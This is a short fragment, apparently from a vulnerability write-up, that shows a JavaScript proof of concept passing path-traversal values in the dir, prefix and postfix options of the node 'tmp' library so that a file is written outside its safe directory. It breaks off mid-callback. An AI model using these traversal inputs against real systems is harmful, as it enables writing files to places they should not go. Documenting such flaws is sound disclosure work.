```

**Advanced Multi-Vector Attack:**
```javascript
const maliciousOpts = {
  tmpdir: '/app/safe-tmp',
  dir: '../../../tmp',           // Escape base
  prefix: '../sensitive-area/',   // Further traversal
  postfix: 'malicious.config'     // Controlled filename
};

tmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {
